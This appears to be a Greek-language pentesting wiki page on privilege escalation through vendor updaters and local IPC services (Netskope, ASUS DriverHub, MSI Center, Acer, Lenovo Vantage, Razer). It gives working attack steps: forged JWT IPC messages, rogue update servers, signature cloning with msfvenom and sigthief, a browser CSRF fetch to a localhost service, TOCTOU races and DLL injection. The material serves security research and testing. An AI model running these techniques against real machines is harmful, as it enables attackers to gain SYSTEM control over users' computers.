# Κατάχρηση εταιρικών auto-updaters και privileged IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων Windows local privilege escalation που εντοπίζονται σε enterprise endpoint agents και updaters, τα οποία εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια privileged ροή ενημέρωσης. Αντιπροσωπευτικό παράδειγμα είναι το Netskope Client για Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά δικαιώματα μπορεί να εξαναγκάσει την εγγραφή σε έναν server που ελέγχει ο επιτιθέμενος και, στη συνέχεια, να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να αξιοποιήσετε σε παρόμοια προϊόντα:
- Καταχραστείτε το localhost IPC μιας privileged υπηρεσίας για να εξαναγκάσετε νέα εγγραφή ή επαναδιαμόρφωση προς έναν server του επιτιθέμενου.
- Υλοποιήστε τα update endpoints του προμηθευτή, παραδώστε ένα rogue Trusted Root CA και κατευθύνετε τον updater σε ένα κακόβουλο, «signed» πακέτο.
- Παρακάμψτε αδύναμους ελέγχους signer (CN allow-lists), προαιρετικά digest flags και χαλαρές ιδιότητες MSI.
- Αν το IPC είναι «encrypted», παράγετε το key/IV από machine identifiers που είναι αναγνώσιμα από όλους και αποθηκεύονται στο registry.
- Αν η υπηρεσία περιορίζει τους callers βάσει image path/process name, κάντε inject σε μια allow-listed διεργασία ή εκκινήστε την σε κατάσταση αναστολής και προετοιμάστε το DLL σας με μια ελάχιστη τροποποίηση του thread context.

Οι προσαρμοσμένες τοπικές υπηρεσίες TCP χρειάζονται τον ίδιο έλεγχο ταυτότητας και ορίων εισόδου, ακόμη κι όταν απαιτούν PIN ή άλλο application credential. Αντιστοιχίστε τον listener στη διεργασία του και στον effective service account και, στη συνέχεια, ελέγξτε το ακριβές deployed binary/version και αν τα πεδία που ελέγχει ο caller ελέγχονται ως προς το μήκος πριν αντιγραφούν σε fixed buffers ή χρησιμοποιηθούν για τη δημιουργία εντολής child-process. Οι [οδηγίες της Microsoft για buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) εξηγούν γιατί η μη ελεγμένη εξωτερική είσοδος είναι επικίνδυνη σε privileged native code. Ένας loopback listener, ένα hardcoded credential ή ένα όνομα διεργασίας από μόνο του δεν αποδεικνύει memory corruption ή εκτέλεση ως SYSTEM· η δυνατότητα πρόσβασης, η εξουσιοδότηση, η διαδρομή εκτέλεσης κώδικα και οι μετριασμοί παραμένουν ξεχωριστές προϋποθέσεις. Διατηρήστε τη συνήθη απαρίθμηση παθητική, αντί να στέλνετε εισόδους μήκους που προκαλούν crash σε μια ενεργή υπηρεσία.

---
## 1) Εξαναγκασμός εγγραφής σε server του επιτιθέμενου μέσω localhost IPC

Πολλοί agents περιλαμβάνουν μια user-mode UI διεργασία που επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token του οποίου τα claims ελέγχουν τον backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None ώστε να μην απαιτείται signature.
2) Στείλτε το IPC μήνυμα που καλεί την εντολή provisioning με το JWT και το όνομα του tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Η υπηρεσία αρχίζει να στέλνει αιτήματα στον rogue server σας για enrollment/config, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται σε path/name, προέλευσε το αίτημα από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC διαχείρισης εκτεθειμένο στο δίκτυο

Αυτό το όριο εμπιστοσύνης δεν περιορίζεται πάντα στο localhost. Στην αναφερόμενη περίπτωση του MyReport Updater 2.1.1, μια υπηρεσία `LocalSystem` έκανε listen σε όλες τις διεπαφές και αποδεχόταν μη επαληθευμένη αλλαγή διαμόρφωσης gRPC για τον reference host, τη θύρα και τον τρόπο λειτουργίας. Για την απομακρυσμένη παραλλαγή απαιτούνταν τόσο πρόσβαση μέσω δικτύου στον listener όσο και εξερχόμενη πρόσβαση από την υπηρεσία προς τον επιλεγμένο reference. Αξιολογήστε αυτά τα στοιχεία ξεχωριστά από το αν η μεταγενέστερη ροή πακέτων μπορεί να παρακάμψει το όριο εγγραφής αρχείων.<sup>[[16]](#references)</sup>

---
## 2) Παραβίαση του update channel για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σας, υλοποιήστε τα αναμενόμενα endpoints και κατευθύνετέ τον σε ένα κακόβουλο MSI. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επιστρέψτε JSON config με πολύ μικρό διάστημα updater, π.χ.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα PEM CA certificate. Η υπηρεσία το εγκαθιστά στο Trusted Root store του Local Machine.
3) /v2/checkupdate → Παρέχετε metadata που δείχνουν σε ένα κακόβουλο MSI και μια πλαστή έκδοση.

Παράκαμψη συνηθισμένων ελέγχων που συναντώνται στην πράξη:
- Allow-list Signer CN: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN είναι “netSkope Inc” ή “Netskope, Inc.”. Το rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- Ιδιότητα CERT_DIGEST: συμπεριλάβετε μια ακίνδυνη ιδιότητα MSI με όνομα CERT_DIGEST. Δεν γίνεται επιβολή κατά την εγκατάσταση.
- Προαιρετική επιβολή digest: μια σημαία config (π.χ. check_msi_digest=false) απενεργοποιεί την πρόσθετη κρυπτογραφική επαλήθευση.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
εκτελώντας αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Δίδαγμα από την παράκαμψη patch: αν ένας vendor απαντήσει προσθέτοντας σε allow-list έναν μικρό αριθμό «έμπιστων» domains, αντί να πιστοποιεί κρυπτογραφικά την πηγή των updates, αναζητήστε redirectors ή reverse proxies που ανήκουν στον vendor και εξακολουθούν να σας επιτρέπουν να κατευθύνετε την κίνηση. Στην περίπτωση της Netskope, μεταγενέστερη δημόσια έρευνα έδειξε ότι μια allow-list της εποχής R129 μπορούσε να γίνει αντικείμενο εκμετάλλευσης μέσω του `rproxy.goskope.com`, το οποίο προωθούσε περιεχόμενο Azure App Service ελεγχόμενο από τον attacker. Αντιμετωπίζετε τις allow-lists hostname ως μικρό εμπόδιο, όχι ως όριο εμπιστοσύνης.<sup>[[14]](#references)</sup>

Ένας άλλος τρόπος αποτυχίας είναι τα **αυτοσυνεπή αλλά μη πιστοποιημένα metadata πακέτου**. Στην περίπτωση του MyReport, μια αναφορά ελεγχόμενη από τον attacker παρείχε ένα τροποποιημένο archive, ενώ ένας intermediary άλλαζε τις απαντήσεις για το MD5 digest και το μέγεθος του vendor πριν φτάσουν στο updater. Η αντιστοίχιση αυτών των τιμών έλεγχε τη συνέπεια των απαντήσεων, όχι την προέλευσή τους από τον vendor· δεν χρειάστηκε σύγκρουση MD5. Ένας κατάλογος εγκατάστασης που επέλεγε ο caller μετέτρεψε έπειτα την privileged εξαγωγή σε όριο εγγραφής αρχείων. Το primitive φόρτωσης DLL που προκύπτει καλύπτεται στην ενότητα [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Πλαστογράφηση κρυπτογραφημένων αιτημάτων IPC (όταν υπάρχουν)

Από την έκδοση R127, η Netskope τύλιγε το JSON IPC σε ένα πεδίο encryptData που μοιάζει με Base64. Η αντίστροφη ανάλυση αποκάλυψε χρήση AES με key/IV που προκύπτουν από τιμές registry αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι attackers μπορούν να αναπαράγουν την κρυπτογράφηση και να στέλνουν έγκυρες κρυπτογραφημένες εντολές από έναν standard user.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent αρχίσει ξαφνικά να «κρυπτογραφεί» το IPC του, αναζητήστε device IDs, product GUIDs και install IDs κάτω από το HKLM ως υλικό για την κρυπτογράφηση.

---
## 4) Παράκαμψη allow-lists caller του IPC (έλεγχοι path/name)

Ορισμένες υπηρεσίες προσπαθούν να πιστοποιήσουν τον peer εντοπίζοντας το PID της TCP σύνδεσης και συγκρίνοντας το image path/name με allow-listed δυαδικά αρχεία του vendor, τα οποία βρίσκονται κάτω από το Program Files (π.χ., stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικές παρακάμψεις:
- DLL injection σε μια allow-listed διεργασία (π.χ., nsdiag.exe) και proxy IPC από το εσωτερικό της.
- Εκκινήστε μια allow-listed δυαδική εφαρμογή σε αναστολή και φορτώστε το proxy DLL σας χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιήσετε τους κανόνες προστασίας από παραβίαση που επιβάλλονται από driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection φιλικό προς την προστασία από παραβίαση: suspended process + NtContinue patch

Τα προϊόντα συχνά περιλαμβάνουν driver minifilter/OB callbacks (π.χ., Stadrv) για να αφαιρούν επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Process: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει τα δικαιώματα σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος user-mode loader που τηρεί αυτούς τους περιορισμούς:
1) Εκτελέστε CreateProcess μιας δυαδικής εφαρμογής του vendor με CREATE_SUSPENDED.
2) Αποκτήστε handles που εξακολουθείτε να δικαιούστε: PROCESS_VM_WRITE | PROCESS_VM_OPERATION για τη διεργασία και ένα handle thread με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME, αν κάνετε patch κώδικα σε γνωστό RIP).
3) Αντικαταστήστε το ntdll!NtContinue (ή κάποιο άλλο early, εγγυημένα φορτωμένο thunk) με ένα μικρό stub που καλεί το LoadLibraryW με τη διαδρομή του DLL σας και έπειτα επιστρέφει.
4) Καλέστε ResumeThread για να εκτελεστεί το stub εντός της διεργασίας και να φορτωθεί το DLL σας.

Εφόσον δεν χρησιμοποιήσατε PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε μια ήδη προστατευμένη διεργασία (εσείς τη δημιουργήσατε), τηρείται η πολιτική του driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Πρακτικά εργαλεία
- Το NachoVPN (plugin της Netskope) αυτοματοποιεί τη δημιουργία rogue CA, την υπογραφή κακόβουλου MSI και την παροχή των απαιτούμενων endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας custom IPC client που δημιουργεί αυθαίρετα μηνύματα IPC (προαιρετικά κρυπτογραφημένα με AES) και περιλαμβάνει injection suspended-process, ώστε τα μηνύματα να προέρχονται από μια allow-listed δυαδική εφαρμογή.<sup>[[4]](#references)</sup>

## 7) Γρήγορη διαδικασία διαλογής για άγνωστες επιφάνειες updater/IPC

Όταν εξετάζετε έναν νέο endpoint agent ή μια σουίτα «βοηθητικών» εργαλείων motherboard, μια γρήγορη διαδικασία συνήθως αρκεί για να καταλάβετε αν πρόκειται για υποσχόμενο στόχο privesc:<sup>[[6]](#references)</sup>

1) Καταγράψτε τους loopback listeners και αντιστοιχίστε τους στις διεργασίες του vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Καταγράψτε τα υποψήφια named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Εξορύξτε δεδομένα δρομολόγησης που αποθηκεύονται στο registry και χρησιμοποιούνται από IPC servers βασισμένους σε plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Αντλήστε πρώτα τα ονόματα των endpoints, τα JSON keys και τα command IDs από το client σε user mode. Τα packed frontends Electron/.NET συχνά κάνουν leak ολόκληρο το schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Αναζητήστε την πραγματική συνθήκη εμπιστοσύνης, όχι μόνο τη διαδρομή κώδικα που τελικά εκκινεί τη διεργασία:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Μοτίβα στα οποία αξίζει να δώσετε προτεραιότητα:
- Η χρήση των `CryptQueryObject`/certificate parsing χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει certificate» θεωρήθηκε ισοδύναμο με το «το certificate είναι έμπιστο», επιτρέποντας cloning certificate ή άλλα κόλπα με πλαστό signer.
- Οι έλεγχοι υποσυμβολοσειράς/κατάληξης σε `Origin`, `Referer`, URLs λήψης, ονόματα διεργασιών ή CN signer δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως εκμεταλλεύσιμο με lookalike domains που ελέγχει ο επιτιθέμενος.
- Αν το GUI με χαμηλά προνόμια αποφασίζει ότι «το αρχείο είναι έμπιστο» και ο SYSTEM broker απλώς χρησιμοποιεί αυτό το αποτέλεσμα, η τροποποίηση ή η επανυλοποίηση του client-side DLL/JS συχνά παρακάμπτει πλήρως το όριο ασφαλείας (διαχωρισμός επικύρωσης τύπου Razer).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και έπειτα το επικυρώνει ή προγραμματίζει την εκτέλεσή του από εκείνη τη διαδρομή, ελέγξτε αμέσως για παράθυρα αντικατάστασης TOCTOU και για sibling plugin modules που εκθέτουν εναλλακτικά wrappers `ExecuteTask()` με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για στόχους με εκτεταμένη χρήση named pipes, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσετε αδύναμα DACL και pipes προσβάσιμα εξ αποστάσεως, πριν αρχίσετε να κάνετε reversing σε βάθος του πρωτοκόλλου.<sup>[[11]](#references)</sup>

Αν ο στόχος κάνει authentication στους callers μόνο βάσει PID, διαδρομής image ή ονόματος διεργασίας, αντιμετωπίστε το ως μικρό εμπόδιο και όχι ως όριο ασφαλείας: συχνά αρκεί είτε να κάνετε injection στον νόμιμο client είτε να συνδεθείτε από διεργασία που περιλαμβάνεται στη λίστα επιτρεπόμενων, ώστε να ικανοποιηθούν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα σχετικά με το client impersonation και την κατάχρηση pipes](named-pipe-client-impersonation.md) καλύπτει την primitive με περισσότερες λεπτομέρειες.

Για έναν privileged **cleanup ή restore broker**, ελέγξτε το όριο εμπιστοσύνης των διαδρομών, καθώς και το ACL του pipe. Ένας caller με χαμηλότερα προνόμια μπορεί να είναι σε θέση να επιλέξει προορισμό restore ή να μετονομάσει ένα staged backup artifact σε κοινόχρηστο κατάλογο, ακόμη κι όταν το εκτελέσιμο του service και ο κατάλογος εγκατάστασής του είναι προστατευμένα. Επιβεβαιώστε ξεχωριστά ότι ο caller μπορεί να καλέσει την εντολή restore, να τροποποιήσει το ακριβές staged input ή το όνομα αρχείου, ότι ο broker εκτελείται με υψηλότερη ταυτότητα και ότι η λειτουργία restore γράφει πράγματι στην επιλεγμένη προστατευμένη διαδρομή. Ένας εγγράψιμος staging directory ή ένα αναγνώσιμο pipe από μόνο του δεν αποδεικνύει δυνατότητα αυθαίρετης εγγραφής με προνόμια· η αντιστοίχιση προορισμού και η συμπεριφορά του service χρειάζονται code review ή ελεγχόμενες δοκιμές. Μην εκτελείτε άγνωστη εντολή cleanup κατά την παθητική αναγνώριση, καθώς μπορεί να διαγράψει αρχεία χρηστών.

---
## 8) Modular add-in brokers με authentication μόνο μέσω vendor signatures (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσετε είναι ο **signed-client RPC broker**: μια διεργασία desktop της Lenovo με χαμηλά προνόμια μιλά με ένα SYSTEM service, και το service δρομολογεί εντολές JSON σε ένα σύνολο add-ins που περιγράφονται σε XML, κάτω από το `%ProgramData%`. Μόλις επιτευχθεί **code execution μέσα σε οποιονδήποτε αποδεκτό signed client**, κάθε σύμβαση `runas="system"` αποτελεί μέρος της επιφάνειας επίθεσης.<sup>[[15]](#references)</sup>

Primitive υψηλής αξίας που παρατηρήθηκαν σε έρευνα για το Lenovo Vantage:
- **Εμπιστοσύνη στον caller επειδή έχει υπογραφεί από τον vendor**: ερευνητές απέκτησαν authenticated context αντιγράφοντας ένα Lenovo-signed EXE σε εγγράψιμο κατάλογο και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε αυθαίρετος κώδικας να εκτελεστεί μέσα σε client που το service ήδη εμπιστευόταν.
- **Ανακάλυψη επιφάνειας επίθεσης μέσω manifest**: τα add-ins δηλώνονται κάτω από το `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`· αρκετές συμβάσεις εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά privileged verbs ταχύτερα από το reversing του ίδιου του broker.
- **Bugs ανά εντολή πίσω από το authenticated channel**: μόλις αποκτήσουν πρόσβαση στον έμπιστο client, δημόσιες έρευνες εντόπισαν path traversal και race conditions σε verbs ενημέρωσης/εγκατάστασης, κατάχρηση raw SQL σε privileged settings databases και ελέγχους διαδρομής registry βασισμένους σε υποσυμβολοσειρές, οι οποίοι επέτρεπαν εγγραφές εκτός του προβλεπόμενου hive.

Χρήσιμη αναγνώριση σε έναν στόχο:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Πρακτικό συμπέρασμα: όταν μια σουίτα βοηθητικών εργαλείων εκθέτει έναν broker που πρώτα πιστοποιεί τη **διαδικασία-καλούντα** και μετά δρομολογεί τις κλήσεις σε δεκάδες εντολές plugin/add-in, μην σταματάς αφού παρακάμψεις τον αρχικό έλεγχο εμπιστοσύνης. Κάνε dump τον πίνακα manifest/contract και κάνε fuzzing σε κάθε verb υψηλών προνομίων ξεχωριστά· το πιστοποιημένο κανάλι συνήθως κρύβει αρκετά σφάλματα δεύτερου σταδίου.

---
## 1) CSRF από browser προς localhost σε προνομιούχα HTTP API (ASUS DriverHub)

Το DriverHub εγκαθιστά μια υπηρεσία HTTP σε user mode (ADU.exe) στη διεύθυνση 127.0.0.1:53000, η οποία αναμένει κλήσεις από browser που προέρχονται από το https://driverhub.asus.com. Το φίλτρο origin εκτελεί απλώς `string_contains(".asus.com")` στην κεφαλίδα Origin και στις διευθύνσεις URL λήψης που εκτίθενται από το `/asus/v1.0/*`. Επομένως, οποιοσδήποτε host ελέγχεται από επιτιθέμενο, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να στείλει αιτήματα που αλλάζουν κατάσταση μέσω JavaScript.<sup>[[6]](#references)</sup> Δες τα [βασικά του CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) για επιπλέον μοτίβα παράκαμψης.

Πρακτική ροή:
1) Κατοχύρωσε ένα domain που περιέχει το `.asus.com` και φιλοξένησε εκεί μια κακόβουλη ιστοσελίδα.
2) Χρησιμοποίησε `fetch` ή XHR για να καλέσεις ένα προνομιούχο endpoint (π.χ. `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλε το JSON body που αναμένει ο handler – το packed frontend JS δείχνει παρακάτω το schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ακόμη και το PowerShell CLI που εμφανίζεται παρακάτω λειτουργεί όταν το Origin header πλαστογραφείται και ορίζεται στην έμπιστη τιμή:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Οποιαδήποτε επίσκεψη από browser στον ιστότοπο του attacker γίνεται έτσι ένα local CSRF με 1 click (ή 0 click μέσω `onload`) που ενεργοποιεί ένα helper με δικαιώματα SYSTEM.

---
## 2) Μη ασφαλής επαλήθευση code-signing και κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του URL λήψης επαναχρησιμοποιεί την ίδια λογική υποσυμβολοσειράς, επομένως γίνεται αποδεκτό το `http://updates.asus.com.attacker.tld:8000/payload.exe`. Μετά τη λήψη, το ADU.exe ελέγχει απλώς ότι το PE περιέχει υπογραφή και ότι η συμβολοσειρά Subject αντιστοιχεί στην ASUS πριν το εκτελέσει – χωρίς `WinVerifyTrust` και χωρίς επικύρωση αλυσίδας πιστοποιητικών.

Για να οπλοποιήσετε τη ροή:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε την υπογραφή του ASUS μέσα σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε ένα lookalike domain `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή τόσο τα φίλτρα Origin όσο και τα φίλτρα URL βασίζονται σε υποσυμβολοσειρές και ο έλεγχος signer συγκρίνει μόνο συμβολοσειρές, το DriverHub κατεβάζει και εκτελεί το binary του attacker με τα αυξημένα δικαιώματά του.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU στις διαδρομές αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η υπηρεσία SYSTEM του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το βασικό component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω του `CS_CommonAPI.EX_CA::Verify` (το subject του πιστοποιητικού πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να επιτύχει).
3) Δημιουργεί μια scheduled task που εκτελεί το προσωρινό αρχείο ως SYSTEM με arguments που ελέγχει ο attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται μεταξύ της επαλήθευσης και της `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει το Frame A με αναφορά σε ένα νόμιμο binary υπογεγραμμένο από την MSI (εξασφαλίζει ότι ο έλεγχος υπογραφής θα περάσει και ότι η task θα προγραμματιστεί).
- Κάνει race με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε ένα κακόβουλο payload, αντικαθιστώντας το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το αντικατασταθέν payload ως SYSTEM, παρότι είχε επικυρώσει το αρχικό αρχείο. Για αξιόπιστη εκμετάλλευση χρησιμοποιούνται δύο goroutines/threads που στέλνουν επανειλημμένα το CMD_AutoUpdateSDK μέχρι να κερδηθεί το παράθυρο TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Κατάχρηση custom IPC και impersonation σε επίπεδο SYSTEM (MSI Center + Acer Control Centre)

### TCP command sets του MSI Center
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογούν εντολές σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίζουν τους δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` **χωρίς επικύρωση υπογραφής** – οποιοσδήποτε local user μπορεί να το κατευθύνει στο `C:\Users\<user>\Desktop\payload.exe` και να αποκτήσει ντετερμινιστικά εκτέλεση ως SYSTEM.
- Η καταγραφή της κίνησης loopback με Wireshark ή η ανάλυση των .NET binaries στο dnSpy αποκαλύπτει γρήγορα την αντιστοίχιση Component ↔ command· στη συνέχεια, custom Go/Python clients μπορούν να επαναλάβουν τα frames.<sup>[[6]](#references)</sup>

### Named pipes του Acer Control Centre και επίπεδα impersonation
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή του command ID `7` μαζί με μια διαδρομή αρχείου καλεί τη ρουτίνα της υπηρεσίας για την εκκίνηση process.
- Η client library σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Η δυναμική ανάλυση με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές σχετικά με instrumentation) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και ένα integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Η αντικατάσταση του 113 (`0x71`) με το 114 (`0x72`) οδηγεί στον generic κλάδο, ο οποίος διατηρεί ολόκληρο το token SYSTEM και ορίζει ένα SID υψηλής ακεραιότητας (`S-1-16-12288`). Επομένως, το binary που ξεκινά εκτελείται ως SYSTEM χωρίς περιορισμούς, τόσο τοπικά όσο και μεταξύ μηχανημάτων.
- Συνδυάστε το με το εκτεθειμένο installer flag (`Setup.exe -nocheck`) για να εγκαταστήσετε το ACC ακόμα και σε lab VMs και να δοκιμάσετε το pipe χωρίς hardware του προμηθευτή.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs αναδεικνύουν γιατί οι υπηρεσίες localhost πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, φίλτρα `ImpersonationLevel=Impersonation`, token filtering) και γιατί ο helper κάθε module για «εκτέλεση αυθαίρετου binary» πρέπει να χρησιμοποιεί τις ίδιες επαληθεύσεις signer.

---
## 3) Helpers COM/IPC «elevator» με αδύναμη επικύρωση σε user mode (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο μοτίβο σε αυτή την κατηγορία: ένας χρήστης με χαμηλά δικαιώματα μπορεί να ζητήσει από έναν COM helper να ξεκινήσει ένα process μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα user-mode DLL (`simple_service.dll`) αντί να επιβάλλεται αξιόπιστα εντός του προνομιακού ορίου.

Διαπιστωμένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε το COM object `RzUtility.Elevator`.
- Καλέστε το `LaunchProcessNoWait(<path>, "", 1)` για να ζητήσετε εκκίνηση με αυξημένα δικαιώματα.
- Στο δημόσιο PoC, το gate υπογραφής PE μέσα στο `simple_service.dll` απενεργοποιείται με patch πριν από την αποστολή του αιτήματος, επιτρέποντας την εκκίνηση οποιουδήποτε εκτελέσιμου επιλέξει ο attacker.<sup>[[6]](#references)[[10]](#references)</sup>

Ελάχιστη κλήση PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

